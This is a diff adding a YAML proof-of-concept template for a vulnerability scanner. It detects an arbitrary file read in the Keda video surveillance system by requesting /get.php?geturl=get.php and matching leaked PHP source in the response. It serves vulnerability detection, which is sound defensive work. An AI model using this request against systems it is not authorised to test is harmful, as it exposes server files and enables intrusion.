@@ -1,0 +1,17 @@
+id: poc-yaml-keda-video-surveillance-arbitray-file-read
+info:
+  name: Keda视频监控系统任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Keda
+  osprey-id: vb_2020_0011
+requests:
+- method: GET
+  path: /get.php?geturl=get.php
+  headers: {}
+  expression: 'status_code == 200 && contains(body, "$pararl = $_GET[''geturl''];")
+
+    '
+variables: {}
+transport: http
